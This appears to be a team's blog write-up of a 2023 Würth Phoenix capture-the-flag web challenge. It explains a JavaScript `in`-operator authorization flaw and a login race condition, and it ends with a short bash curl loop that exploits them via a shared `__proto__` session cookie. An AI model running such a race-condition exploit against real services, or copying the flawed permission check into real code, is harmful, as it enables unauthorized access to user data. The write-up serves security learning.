---
layout: default
title: "Würth Phoenix CTF 2023 writeup of User Management"
title_left: WPCTF2023
fn_keys:
  - key: F3
    text: Exit
    href: "/blog"
  - key: F12
    text: Print
    href: "#"
    onclick: "window.print(); return false"
description: Writeup of the Würth Phoenix CTF challenge 2023 challenge User Management
---

# Würth Phoenix 2023 Writeup

The 2023 edition of the Würth Phoenix challenge went great for our team Pearàk, winning the 
competition.

Among the multiple challenges that we solved, one we enjoyed one in particular, and we also
were the only one to solve it.

So here is the writeup.

## User Management

The challenge presents with a login page where you can register. From a first analysis of the
code (that fortunately we had access to) we could see that there were 3 users:

```js
const insert = 'INSERT INTO user (name, surname, password, enabled) VALUES (?,?,?,?)';
db.run(insert, ["admin","admin",crypto.randomBytes(20).toString('hex'),0])
db.run(insert, ["anyone","anyone","anyone",1])
db.run(insert, ["flag",FLAG,crypto.randomBytes(20).toString('hex'), 0])
```

As it can be seen, the only account that we can use is "anyone" with password "anyone".
The other accounts we can not use it for two reasons, first they are not enabled, and 
second we don't know the password (nobody does, anyway). 

It's also clear that the flag is in the surname field of the "flag" user, that however
we can not use it.

From an analysis of the code we also see that there is no possibility to do SQL injection.
We need to invent something else!

We also see that there is an user privilege mechanism:
```js
exports.PERMISSION = {
    ADMIN: 0,
    GUEST: 1,
}

db.run(`CREATE TABLE permissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name text UNIQUE,
    permission integer, 
    CONSTRAINT name UNIQUE (name)
  )`,
  (err) => {
      if (!err) {
          // Table just created, creating some rows
          const insert = 'INSERT INTO permissions (name, permission) VALUES (?,?)';
          db.run(insert, ["admin",0])
          // db.run(insert, ["anyone",1])
          db.run(insert, ["flag",1])
      }
  }); 
```

As it can be seen, the "flag" user has no permission at all (we will see why this is important later!).

## First intuition

We see that we can call this API to retrieve the information of all the users:

```js
app.get("/api/users",async (req, res) =>{
    if(
        req.session.user && session_manager.PERMISSION.ADMIN in req.session.user.permission
    ){  // check if users has session_manager.PERMISSION.ADMIN
        db.all("SELECT id, name, surname, permission, '***' as password FROM user", (err, users)=>{
            res.json({
                success: true,
                users: users
            });
        });
    }else{
        res.status(401).json({
            success: false,
            error: "Unauthorized"
        });
    }    
})
```

We stared at this code for too much time without seeing the issue. Can you spot it?

Let me hint something to you, if you did uncomment the insert at the previous chapter of the 
permission this code would have validated the user as an admin! How you say? The code did 
only tell you that the user was a guest.

Well... what does the `in` operator to in JavaScript? Not what you expect! It checks that the 
specified **key** is in the array. In this case the key `0`. Thus, this check will pass not only
for admin users, but for users whom the `permission` array is not empty!

## Second vulnerability

Well, but we can't do nothing. Because, we seen that the `permission` array of the user was empty, 
at the previous chapter. Are you sure about that? Let's see how an user is created:

```js
app.post('/login', async(req, res) => {
    db.all("SELECT * FROM user WHERE name=? AND enabled=1", [req.body.username], (err, users)=>{
        // omitted password check. No vulnerability is there! 

        req.session.user = {
            name: user.name,
            surname: user.surname,
            permission: [session_manager.PERMISSION.GUEST], // default no permission
            id: user.id,
        }

        // HERE!!!

        db.all("SELECT * FROM permissions WHERE name=?", [req.body.username], (err, permissions)=>{
            req.session.user.permission = permissions.map((p)=>p.permission) || [];
        })

        res.json({
            success: true
        });
    });
});
```

As you can see, first the session of the user is first created with a `permission` array initialized
with a guest element. For the broken check at the previous chapter, we can say for sure that if we 
would have called the API `/api/users` in that particular point of the flow of execution, the API 
would have returned US the user list!

So... basically it's a race condition! 

## Exploit

So we could have a thread that continues logging in the `anyone` user, and another thread continuing
calling the `/api/users` API, and we would have a moment where the call would return, since the second 
SQL query does indeed block the request handler and may unlock the handling of the request of the 
other call. 

We have only one last issue to address. The session generation! How can we make sure that we use always
the same session token? Well, simple enough. If you see the session id is not reset when the user logs in,
indeed the session ID of the request is used if provided in the cookie. 

We just have to make sure that the two threads use the same session ID to make this work. Since the 
session ID is just a key in a JS object, we can just use a property that for sure is present in an 
object (like `__proto__`). I initially seen it as a potential third vulnerability, but now that I 
think of it it was not strictly necessary, we could have just have invoked `/login` once, got the 
session token and then used it for the two threads. 

Here is an ugly crafted bash script to exploit it (yes, it's a terrible hack, but it works!):

```bash
# login request thread
(while true; do curl http://$1/login -H 'Content-Type: application/json' -d '{ "username": "anyone", "password": "anyone" }' -H 'Cookie: session_id=__proto__; Path=/' 2>/dev/null >/dev/null; done) &

# api users thread
while true; do
  curl http://$1/api/users -H 'Cookie: session_id=__proto__; Path=/' 2>/dev/null | grep flag
done;
```

In less than a second the race condition is triggered and we got the flag!

## Conclusion

The Würth Phoenix CTF was a very fun event, and we want to thank al the organizers for the 
great time and prizes we had!

